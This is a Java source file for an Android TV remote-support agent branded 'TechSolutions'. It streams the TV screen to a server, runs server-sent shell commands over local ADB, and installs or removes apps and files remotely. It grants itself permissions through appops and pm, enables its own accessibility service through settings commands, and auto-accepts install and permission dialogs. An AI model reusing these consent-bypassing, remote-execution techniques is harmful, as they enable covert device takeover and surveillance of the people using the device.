package com.arilson.tvremote;

import android.accessibilityservice.AccessibilityService;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageInstaller;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.AudioManager;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.util.DisplayMetrics;
import android.view.View;
import android.view.WindowManager;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.URLEncoder;
import java.nio.ByteBuffer;
import java.util.HashSet;
import java.util.List;
import java.util.Set;
import java.util.Locale;
import java.util.concurrent.TimeUnit;

import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import okhttp3.WebSocket;
import okhttp3.WebSocketListener;
import okio.ByteString;

public class AgentService extends Service {
    static volatile AgentService instance;
    static volatile String connState = "desconectado";

    private final Handler main = new Handler(Looper.getMainLooper());
    private OkHttpClient http;
    private WebSocket ws;
    private boolean connected = false;
    private int retry = 0;
    private PowerManager.WakeLock wake;

    // captura
    private MediaProjection projection;
    private VirtualDisplay vdisplay;
    private ImageReader reader;
    private HandlerThread capThread;
    private Handler capHandler;
    private volatile boolean streamWanted = false;
    private volatile int maxSize = 960, quality = 60, fps = 10;
    private volatile long lastFrame = 0;
    private int screenW, screenH;

    static void start(Context c) {
        Intent i = new Intent(c, AgentService.class);
        try {
            if (Build.VERSION.SDK_INT >= 26) c.startForegroundService(i); else c.startService(i);
        } catch (Exception ignored) {}
    }

    static void status(String level, String msg) {
        AgentService s = instance;
        if (s == null) return;
        try { s.sendJson(new JSONObject().put("type", "status").put("level", level).put("msg", msg)); } catch (Exception ignored) {}
    }

    /** Chamado quando o ADB local conecta/cai: se auto-libera tudo e avisa o painel. */
    static void adbChanged() {
        AgentService s = instance;
        if (s == null) return;
        if (AdbShell.isReady()) {
            String me = s.getPackageName();
            AdbShell a = AdbShell.get(s);
            a.run("appops set " + me + " PROJECT_MEDIA allow");
            a.run("appops set " + me + " REQUEST_INSTALL_PACKAGES allow");
            a.run("pm grant " + me + " android.permission.READ_EXTERNAL_STORAGE; pm grant " + me + " android.permission.WRITE_EXTERNAL_STORAGE");
            a.run("dumpsys deviceidle whitelist +" + me + " >/dev/null 2>&1");
            String svc = me + "/.RemoteAccessibility";
            a.run("s=$(settings get secure enabled_accessibility_services); case \"$s\" in *" + svc + "*) ;; null|'') settings put secure enabled_accessibility_services " + svc + " ;; *) settings put secure enabled_accessibility_services \"$s:" + svc + "\" ;; esac; settings put secure accessibility_enabled 1");
            status("ok", "Modo avançado ativo: controle total liberado");
        }
        s.sendInfo();
    }

    static void sendInfoIfConnected() { if (instance != null) instance.sendInfo(); }

    private static int pendingCode; private static Intent pendingData;
    static void deliverProjection(Context c, int code, Intent data) {
        if (instance != null) instance.onProjectionGranted(code, data);
        else { pendingCode = code; pendingData = data; start(c); }
    }

    @Override public IBinder onBind(Intent i) { return null; }

    @Override public void onCreate() {
        super.onCreate();
        instance = this;
        startForegroundNotif();
        http = new OkHttpClient.Builder()
                .pingInterval(20, TimeUnit.SECONDS)
                .connectTimeout(15, TimeUnit.SECONDS)
                .readTimeout(0, TimeUnit.SECONDS)
                .retryOnConnectionFailure(true)
                .build();
        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        wake = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "tvremote:agent");
        wake.setReferenceCounted(false);
        wake.acquire();
        capThread = new HandlerThread("capture"); capThread.start();
        capHandler = new Handler(capThread.getLooper());
        readScreenSize();
        connect();
        AdbShell.get(this).ensure();
        if (pendingData != null) { Intent d = pendingData; pendingData = null; onProjectionGranted(pendingCode, d); }
    }

    @Override public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null && intent.getBooleanExtra("reconnect", false)) { retry = 0; reconnectNow(); }
        return START_STICKY;
    }

    @Override public void onDestroy() {
        instance = null;
        try { if (ws != null) ws.close(1000, "bye"); } catch (Exception ignored) {}
        stopCapture(true);
        if (wake != null && wake.isHeld()) wake.release();
        capThread.quitSafely();
        super.onDestroy();
    }

    private void startForegroundNotif() {
        NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
        Notification.Builder b;
        if (Build.VERSION.SDK_INT >= 26) {
            nm.createNotificationChannel(new NotificationChannel("agent", "Assistência remota", NotificationManager.IMPORTANCE_LOW));
            b = new Notification.Builder(this, "agent");
        } else b = new Notification.Builder(this);
        PendingIntent pi = PendingIntent.getActivity(this, 0, new Intent(this, MainActivity.class),
                Build.VERSION.SDK_INT >= 23 ? PendingIntent.FLAG_IMMUTABLE : 0);
        Notification n = b.setContentTitle(getString(R.string.app_name)).setContentText("Suporte remoto ativo")
                .setSmallIcon(android.R.drawable.stat_sys_upload_done).setContentIntent(pi).setOngoing(true).build();
        startForeground(1, n);
    }

    // ---------------- WebSocket ----------------
    private void connect() {
        try {
            String base = Prefs.httpBase(this).replaceFirst("^http", "ws");
            String url = base + "/ws?role=agent&id=" + enc(Prefs.deviceId(this)) + "&name=" + enc(Prefs.name(this))
                    + "&token=" + enc(Prefs.token(this));
            connState = "conectando...";
            ws = http.newWebSocket(new Request.Builder().url(url).build(), new Listener());
        } catch (Exception e) {
            connState = "erro: " + e.getMessage();
            scheduleReconnect();
        }
    }
    private void reconnectNow() {
        try { if (ws != null) ws.cancel(); } catch (Exception ignored) {}
        connected = false;
        main.removeCallbacksAndMessages(null);
        connect();
    }
    private void scheduleReconnect() {
        long delay = Math.min(30000, 1000L * (1 << Math.min(retry++, 5)));
        main.postDelayed(new Runnable() { public void run() { connect(); } }, delay);
    }
    private static String enc(String s) { try { return URLEncoder.encode(s, "UTF-8"); } catch (Exception e) { return s; } }

    private class Listener extends WebSocketListener {
        @Override public void onOpen(WebSocket w, Response r) {
            if (w != ws) return;
            connected = true; retry = 0; connState = "conectado";
            sendInfo();
        }
        @Override public void onMessage(WebSocket w, final String text) {
            main.post(new Runnable() { public void run() {
                try { handle(new JSONObject(text)); } catch (Exception e) { status("error", "Comando falhou: " + e); }
            }});
        }
        @Override public void onClosing(WebSocket w, int code, String reason) { w.close(1000, null); }
        @Override public void onClosed(WebSocket w, int code, String reason) { lost(w, code == 4001 ? "token inválido" : "desconectado"); }
        @Override public void onFailure(WebSocket w, Throwable t, Response r) { lost(w, "falha: " + t.getMessage()); }
    }
    private void lost(final WebSocket w, final String why) {
        main.post(new Runnable() { public void run() {
            if (w != ws) return;
            connected = false; connState = why; streamWanted = false;
            releaseDisplay();
            scheduleReconnect();
        }});
    }

    void sendJson(JSONObject o) { if (ws != null && connected) ws.send(o.toString()); }

    void sendInfo() {
        try {
            JSONObject info = new JSONObject()
                    .put("name", Prefs.name(this))
                    .put("model", Build.MANUFACTURER + " " + Build.MODEL)
                    .put("android", Build.VERSION.RELEASE)
                    .put("sdk", Build.VERSION.SDK_INT)
                    .put("accessibility", RemoteAccessibility.enabled())
                    .put("capturing", projection != null)
                    .put("canInstall", Build.VERSION.SDK_INT < 26 || getPackageManager().canRequestPackageInstalls())
                    .put("screen", screenW + "x" + screenH)
                    .put("storage", storageInfo())
                    .put("adb", AdbShell.isReady() ? "ativo" : AdbShell.state)
                    .put("agentVersion", BuildInfo.VERSION);
            sendJson(new JSONObject().put("type", "info").put("info", info));
        } catch (Exception ignored) {}
    }
    private void sendScreenState() {
        try { sendJson(new JSONObject().put("type", "screen").put("w", screenW).put("h", screenH).put("capturing", projection != null)); }
        catch (Exception ignored) {}
    }

    // ---------------- comandos ----------------
    private void handle(JSONObject m) throws Exception {
        String type = m.optString("type");
        RemoteAccessibility acc = RemoteAccessibility.instance;
        switch (type) {
            case "hello": AdbShell.get(this).ensure(); sendInfo(); sendScreenState(); forceKeyframe(); if (streamWanted && projection != null) ensureDisplay(); return;
            case "stream":
                streamWanted = m.optBoolean("on");
                if (streamWanted) {
                    if (projection == null) requestProjection(); else ensureDisplay();
                } else releaseDisplay();
                return;
            case "startCapture": if (projection == null) requestProjection(); else { ensureDisplay(); sendScreenState(); } return;
            case "quality":
                maxSize = m.optInt("max", 960); quality = m.optInt("q", 60); fps = Math.max(1, m.optInt("fps", 10));
                if (vdisplay != null) { releaseDisplay(); ensureDisplay(); }
                return;
            case "info": sendInfo(); return;
            case "apps": sendApps(); return;
            case "launch": launch(m.getString("pkg")); return;
            case "uninstall": uninstall(m.getString("pkg")); return;
            case "install": install(m); return;
            case "files": Files.list(this, m.optString("path", "")); return;
            case "mkdir": Files.mkdir(this, m.getString("path")); return;
            case "deleteFile": Files.delete(this, m.getString("path")); return;
            case "installLocal": installLocal(m.getString("path"), m.optString("name", "app.apk")); return;
            case "sendFile": Files.upload(this, http, m.getString("path"), m.optString("name", "")); return;
            case "putFile": Files.download(this, http, m); return;
            case "selfUpdate": selfUpdate(); return;
            case "toast": showToast(m.getString("text")); return;
            case "openUrl": openUrl(m.getString("url")); return;
            case "enableInstall": enableInstall(); return;
            case "enableFiles": enableFiles(); return;
            case "openSettings": RemoteAccessibility.startActivityAny(this, new Intent(m.getString("action"))); return;
            case "adbConnect": AdbShell.get(this).ensure(); status("info", "Modo avançado: " + AdbShell.state); return;
            case "shell":
                if (!AdbShell.isReady()) { status("error", "Modo avançado não está ativo"); return; }
                AdbShell.get(this).run(m.getString("cmd")); return;
        }
        if ("key".equals(type) && adbKey(m.getString("key"))) return;
        if ("text".equals(type) && acc == null && AdbShell.isReady()) { adbText(m.getString("text")); return; }
        if (acc == null) { status("error", "Acessibilidade desativada na TV: ative em Configurações > Acessibilidade > " + getString(R.string.app_name)); return; }
        readScreenSize();
        switch (type) {
            case "tap": acc.tap((float) m.getDouble("x") * screenW, (float) m.getDouble("y") * screenH, 60); break;
            case "longpress": acc.tap((float) m.getDouble("x") * screenW, (float) m.getDouble("y") * screenH, 900); break;
            case "swipe":
                acc.swipe((float) m.getDouble("x1") * screenW, (float) m.getDouble("y1") * screenH,
                        (float) m.getDouble("x2") * screenW, (float) m.getDouble("y2") * screenH, m.optLong("ms", 300));
                break;
            case "text":
                if (!acc.setText(m.getString("text"))) {
                    if (AdbShell.isReady()) adbText(m.getString("text"));
                    else status("error", "Nenhum campo de texto focado");
                }
                break;
            case "key": key(acc, m.getString("key")); break;
            case "tree":
                sendJson(new JSONObject().put("type", "tree").put("nodes", acc.tree(screenW, screenH)));
                break;
        }
    }

    /** Teclas de verdade via ADB local (funcionam dentro de qualquer app). */
    private boolean adbKey(String k) {
        if (!AdbShell.isReady()) { AdbShell.get(this).ensure(); return false; }
        int code;
        switch (k) {
            case "up": code = 19; break;
            case "down": code = 20; break;
            case "left": code = 21; break;
            case "right": code = 22; break;
            case "ok": code = 23; break;
            case "back": code = 4; break;
            case "home": code = 3; break;
            case "recents": code = 187; break;
            case "menu": code = 82; break;
            case "playpause": code = 85; break;
            default: return false;
        }
        return AdbShell.get(this).key(code);
    }

    private void adbText(String t) {
        StringBuilder b = new StringBuilder();
        for (char c : t.toCharArray()) {
            if (c == ' ') b.append("%s");
            else if (c == '\'') b.append("'\\''");
            else b.append(c);
        }
        AdbShell.get(this).run("input text '" + b + "'");
    }

    private void key(RemoteAccessibility acc, String k) {
        AudioManager am = (AudioManager) getSystemService(AUDIO_SERVICE);
        switch (k) {
            case "back": acc.global(AccessibilityService.GLOBAL_ACTION_BACK); break;
            case "home": acc.global(AccessibilityService.GLOBAL_ACTION_HOME); break;
            case "recents": acc.global(AccessibilityService.GLOBAL_ACTION_RECENTS); break;
            case "notifications": acc.global(AccessibilityService.GLOBAL_ACTION_NOTIFICATIONS); break;
            case "up": acc.dpad(View.FOCUS_UP); break;
            case "down": acc.dpad(View.FOCUS_DOWN); break;
            case "left": acc.dpad(View.FOCUS_LEFT); break;
            case "right": acc.dpad(View.FOCUS_RIGHT); break;
            case "ok": acc.clickFocused(screenW, screenH); break;
            case "volup": am.adjustStreamVolume(AudioManager.STREAM_MUSIC, AudioManager.ADJUST_RAISE, AudioManager.FLAG_SHOW_UI); break;
            case "voldown": am.adjustStreamVolume(AudioManager.STREAM_MUSIC, AudioManager.ADJUST_LOWER, AudioManager.FLAG_SHOW_UI); break;
            case "mute": am.adjustStreamVolume(AudioManager.STREAM_MUSIC, AudioManager.ADJUST_TOGGLE_MUTE, AudioManager.FLAG_SHOW_UI); break;
        }
    }

    void sendApps() {
        new Thread(new Runnable() { public void run() {
            try {
                PackageManager pm = getPackageManager();
                Set<String> pkgs = new HashSet<>();
                Intent i1 = new Intent(Intent.ACTION_MAIN).addCategory(Intent.CATEGORY_LAUNCHER);
                Intent i2 = new Intent(Intent.ACTION_MAIN).addCategory(Intent.CATEGORY_LEANBACK_LAUNCHER);
                for (ResolveInfo r : pm.queryIntentActivities(i1, 0)) pkgs.add(r.activityInfo.packageName);
                for (ResolveInfo r : pm.queryIntentActivities(i2, 0)) pkgs.add(r.activityInfo.packageName);
                JSONArray arr = new JSONArray();
                for (String p : pkgs) {
                    try {
                        PackageInfo pi = pm.getPackageInfo(p, 0);
                        ApplicationInfo ai = pi.applicationInfo;
                        arr.put(new JSONObject().put("pkg", p).put("label", String.valueOf(pm.getApplicationLabel(ai)))
                                .put("version", pi.versionName).put("system", (ai.flags & ApplicationInfo.FLAG_SYSTEM) != 0));
                    } catch (Exception ignored) {}
                }
                sendJson(new JSONObject().put("type", "apps").put("list", arr));
            } catch (Exception e) { status("error", "Lista de apps: " + e); }
        }}).start();
    }

    private void launch(String pkg) {
        PackageManager pm = getPackageManager();
        Intent i = pm.getLeanbackLaunchIntentForPackage(pkg);
        if (i == null) i = pm.getLaunchIntentForPackage(pkg);
        if (i == null) { status("error", "App sem tela inicial: " + pkg); return; }
        RemoteAccessibility.startActivityAny(this, i);
        status("ok", "Abrindo " + pkg);
    }

    private void uninstall(String pkg) {
        Intent cb = new Intent(this, InstallReceiver.class).putExtra("apkname", pkg).putExtra("action", "Desinstalação");
        PendingIntent pi = PendingIntent.getBroadcast(this, (int) (System.currentTimeMillis() & 0xffff), cb, piFlags());
        RemoteAccessibility.autoAccept(30000);
        getPackageManager().getPackageInstaller().uninstall(pkg, pi.getIntentSender());
        status("info", "Desinstalando " + pkg + "...");
    }

    private static int piFlags() {
        int f = PendingIntent.FLAG_UPDATE_CURRENT;
        if (Build.VERSION.SDK_INT >= 31) f |= 0x02000000; // FLAG_MUTABLE (o instalador preenche extras)
        return f;
    }

    private void install(final JSONObject m) {
        if (Build.VERSION.SDK_INT >= 26 && !getPackageManager().canRequestPackageInstalls()) {
            status("error", "Falta permissão 'Instalar apps desconhecidos' para o agente. Abrindo a tela na TV...");
            Intent i = new Intent(android.provider.Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES, android.net.Uri.parse("package:" + getPackageName()));
            RemoteAccessibility.startActivityAny(this, i);
            return;
        }
        new Thread(new Runnable() { public void run() {
            String name = m.optString("name", "app.apk");
            File f = new File(getCacheDir(), "dl.apk");
            try {
                String url = m.optString("url", "");
                if (url.isEmpty()) url = Prefs.httpBase(AgentService.this) + m.getString("path") + "?token=" + enc(Prefs.token(AgentService.this));
                status("info", "Baixando " + name + "...");
                Response r = http.newCall(new Request.Builder().url(url).build()).execute();
                if (!r.isSuccessful()) throw new Exception("HTTP " + r.code());
                long total = r.body().contentLength();
                InputStream in = r.body().byteStream();
                OutputStream out = new FileOutputStream(f);
                byte[] buf = new byte[64 * 1024];
                long done = 0; int n, lastPct = -1;
                while ((n = in.read(buf)) > 0) {
                    out.write(buf, 0, n); done += n;
                    if (total > 0) {
                        int pct = (int) (done * 100 / total);
                        if (pct / 5 != lastPct / 5) { lastPct = pct;
                            sendJson(new JSONObject().put("type", "progress").put("name", name).put("key", "dl-" + name).put("pct", pct)); }
                    }
                }
                out.close(); in.close();
                commitApk(f, name);
            } catch (Exception e) {
                status("error", "Instalação falhou: " + e.getMessage());
            } finally {
                main.postDelayed(new Runnable() { public void run() { new File(getCacheDir(), "dl.apk").delete(); } }, 120000);
            }
        }}).start();
    }

    /** Instala um APK que já está num arquivo local da TV. */
    private void installLocal(final String path, final String name) {
        if (Build.VERSION.SDK_INT >= 26 && !getPackageManager().canRequestPackageInstalls()) { enableInstall(); return; }
        new Thread(new Runnable() { public void run() {
            try {
                File f = new File(path);
                if (!f.isFile()) { status("error", "Arquivo não encontrado: " + path); return; }
                status("info", "Instalando " + name + "...");
                commitApk(f, name);
            } catch (Exception e) { status("error", "Instalação falhou: " + e.getMessage()); }
        }}).start();
    }

    /** Grava o APK numa sessão do PackageInstaller e confirma (auto-aceita o diálogo). */
    private void commitApk(File f, String name) throws Exception {
        PackageInstaller pi = getPackageManager().getPackageInstaller();
        PackageInstaller.SessionParams sp = new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
        sp.setSize(f.length());
        int sid = pi.createSession(sp);
        PackageInstaller.Session s = pi.openSession(sid);
        OutputStream so = s.openWrite("base.apk", 0, f.length());
        InputStream fi = new FileInputStream(f);
        byte[] buf = new byte[64 * 1024]; int n;
        while ((n = fi.read(buf)) > 0) so.write(buf, 0, n);
        s.fsync(so); so.close(); fi.close();
        Intent cb = new Intent(this, InstallReceiver.class).putExtra("apkname", name).putExtra("action", "Instalação");
        PendingIntent p = PendingIntent.getBroadcast(this, sid, cb, piFlags());
        RemoteAccessibility.autoAccept(60000);
        s.commit(p.getIntentSender());
        s.close();
        status("info", "Instalando " + name + "...");
    }

    static void triggerSelfUpdate() { if (instance != null) instance.selfUpdate(); }

    /** Liga remotamente "instalar apps desconhecidos": abre a tela e aceita sozinho. */
    private void enableInstall() {
        if (Build.VERSION.SDK_INT < 26 || getPackageManager().canRequestPackageInstalls()) { status("ok", "Instalar apps já está liberado"); sendInfo(); return; }
        RemoteAccessibility.autoAccept(15000);
        Intent i = new Intent(android.provider.Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES, android.net.Uri.parse("package:" + getPackageName()));
        RemoteAccessibility.startActivityAny(this, i);
        status("info", "Liberando 'instalar apps' na TV...");
        main.postDelayed(new Runnable() { public void run() { sendInfo(); } }, 4000);
    }

    /** Liga remotamente o acesso a arquivos. */
    private void enableFiles() {
        if (Build.VERSION.SDK_INT < 23) { status("ok", "Arquivos já liberado"); return; }
        RemoteAccessibility.autoAccept(15000);
        Intent i = new Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS, android.net.Uri.parse("package:" + getPackageName()));
        RemoteAccessibility.startActivityAny(this, i);
        status("info", "Abri as permissões do app na TV: liberando arquivos...");
    }

    /** Baixa e instala o próprio APK mais novo do servidor (botão "Atualizar app"). */
    private void selfUpdate() {
        try {
            JSONObject m = new JSONObject().put("url", Prefs.httpBase(this) + "/agent.apk?token=" + enc(Prefs.token(this)))
                    .put("name", "TechSolutions (atualização)");
            status("info", "Baixando atualização do app...");
            install(m);
        } catch (Exception e) { status("error", "Atualização falhou: " + e.getMessage()); }
    }

    private void showToast(final String text) {
        main.post(new Runnable() { public void run() {
            try { android.widget.Toast.makeText(AgentService.this, text, android.widget.Toast.LENGTH_LONG).show(); status("ok", "Mensagem exibida na TV"); }
            catch (Exception e) { status("error", "Não consegui exibir: " + e.getMessage()); }
        }});
    }

    private void openUrl(String url) {
        try {
            if (!url.contains("://")) url = "http://" + url;
            Intent i = new Intent(Intent.ACTION_VIEW, android.net.Uri.parse(url));
            RemoteAccessibility.startActivityAny(this, i);
            status("ok", "Abrindo " + url);
        } catch (Exception e) { status("error", "Não consegui abrir o link: " + e.getMessage()); }
    }

    private String storageInfo() {
        try {
            android.os.StatFs st = new android.os.StatFs(android.os.Environment.getDataDirectory().getPath());
            long free = st.getAvailableBytes(), total = st.getTotalBytes();
            return (free / 1073741824.0 > 1 ? String.format(Locale.US, "%.1f", free / 1073741824.0) + " GB"
                    : (free / 1048576) + " MB") + " livres de " + String.format(Locale.US, "%.1f", total / 1073741824.0) + " GB";
        } catch (Exception e) { return ""; }
    }

    // ---------------- captura de tela ----------------
    private void readScreenSize() {
        DisplayMetrics dm = new DisplayMetrics();
        ((WindowManager) getSystemService(WINDOW_SERVICE)).getDefaultDisplay().getRealMetrics(dm);
        screenW = dm.widthPixels; screenH = dm.heightPixels;
    }

    private long lastRequest = 0;
    private void requestProjection() {
        if (System.currentTimeMillis() - lastRequest < 5000) return;
        lastRequest = System.currentTimeMillis();
        status("info", "Pedindo permissão de captura de tela na TV...");
        Intent i = new Intent(this, ProjectionActivity.class).putExtra("auto", true);
        RemoteAccessibility.startActivityAny(this, i);
    }

    static boolean capturing() { AgentService s = instance; return s != null && s.projection != null; }

    void onProjectionGranted(int code, Intent data) {
        MediaProjectionManager mpm = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
        // encerra a projeção anterior (se houver) antes de usar a nova
        if (projection != null) { MediaProjection old = projection; projection = null; releaseDisplay(); try { old.stop(); } catch (Exception ignored) {} }
        final MediaProjection mp;
        try { mp = mpm.getMediaProjection(code, data); }
        catch (Exception e) { status("error", "Falha ao obter captura: " + e.getMessage()); return; }
        if (mp == null) { status("error", "Projeção nula"); return; }
        projection = mp;
        mp.registerCallback(new MediaProjection.Callback() {
            @Override public void onStop() { main.post(new Runnable() { public void run() {
                if (projection != mp) return; // é uma projeção antiga
                releaseDisplay(); projection = null;
                status("error", "A TV encerrou o compartilhamento de tela");
                sendScreenState(); sendInfo();
            } }); }
        }, main);
        status("ok", "Captura de tela autorizada");
        sendInfo();
        if (streamWanted) ensureDisplay();
        sendScreenState();
    }

    private void ensureDisplay() {
        if (projection == null || vdisplay != null) return;
        readScreenSize();
        float scale = Math.min(1f, (float) maxSize / Math.max(screenW, screenH));
        int w = Math.max(2, Math.round(screenW * scale)) & ~1, h = Math.max(2, Math.round(screenH * scale)) & ~1;
        reader = ImageReader.newInstance(w, h, PixelFormat.RGBA_8888, 3);
        frameW = w; frameH = h;
        reader.setOnImageAvailableListener(new ImageReader.OnImageAvailableListener() {
            @Override public void onImageAvailable(ImageReader r) { onFrame(r); }
        }, capHandler);
        try {
            vdisplay = projection.createVirtualDisplay("tvremote", w, h, 160,
                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, reader.getSurface(), null, capHandler);
            forceKeyframe();
            capHandler.removeCallbacks(sender);
            capHandler.post(sender);
        } catch (Exception e) {
            status("error", "Falha ao iniciar captura: " + e.getMessage());
            releaseDisplay();
        }
    }

    // Último quadro recebido (copiado do ImageReader); o envio é feito pelo "sender",
    // que respeita o FPS e reenvia a tela a cada 2 s mesmo se nada mudar.
    private final Object frameLock = new Object();
    private Bitmap frameBmp;
    private volatile boolean frameDirty = false;
    private volatile long lastSent = 0;
    private int frameW, frameH;

    void forceKeyframe() { lastSent = 0; frameDirty = true; }

    private void onFrame(ImageReader r) {
        Image img = null;
        try {
            img = r.acquireLatestImage();
            if (img == null) return;
            Image.Plane p = img.getPlanes()[0];
            ByteBuffer buf = p.getBuffer();
            int rowPx = p.getRowStride() / p.getPixelStride();
            int h = img.getHeight();
            synchronized (frameLock) {
                if (frameBmp == null || frameBmp.getWidth() != rowPx || frameBmp.getHeight() != h)
                    frameBmp = Bitmap.createBitmap(rowPx, h, Bitmap.Config.ARGB_8888);
                frameBmp.copyPixelsFromBuffer(buf);
                frameDirty = true;
            }
        } catch (Exception ignored) {
        } finally { if (img != null) img.close(); }
    }

    private final Runnable sender = new Runnable() { public void run() {
        if (vdisplay == null) return;
        long now = System.currentTimeMillis();
        try {
            WebSocket sock = ws;
            boolean due = frameDirty || now - lastSent > 2000;
            if (streamWanted && connected && sock != null && due && sock.queueSize() < 512 * 1024) {
                byte[] jpg = null;
                synchronized (frameLock) {
                    if (frameBmp != null) {
                        Bitmap out = frameBmp.getWidth() == frameW ? frameBmp : Bitmap.createBitmap(frameBmp, 0, 0, Math.min(frameW, frameBmp.getWidth()), frameBmp.getHeight());
                        ByteArrayOutputStream bos = new ByteArrayOutputStream(64 * 1024);
                        out.compress(Bitmap.CompressFormat.JPEG, quality, bos);
                        if (out != frameBmp) out.recycle();
                        jpg = bos.toByteArray();
                        frameDirty = false;
                    }
                }
                if (jpg != null) { sock.send(ByteString.of(jpg)); lastSent = now; }
            }
        } catch (Exception ignored) {}
        capHandler.postDelayed(this, Math.max(30, 1000 / Math.max(1, fps)));
    }};

    private void releaseDisplay() {
        if (capHandler != null) capHandler.removeCallbacks(sender);
        if (vdisplay != null) { try { vdisplay.release(); } catch (Exception ignored) {} vdisplay = null; }
        if (reader != null) { try { reader.close(); } catch (Exception ignored) {} reader = null; }
    }

    private void stopCapture(boolean stopProjection) {
        releaseDisplay();
        if (stopProjection && projection != null) try { projection.stop(); } catch (Exception ignored) {}
        projection = null;
    }
}
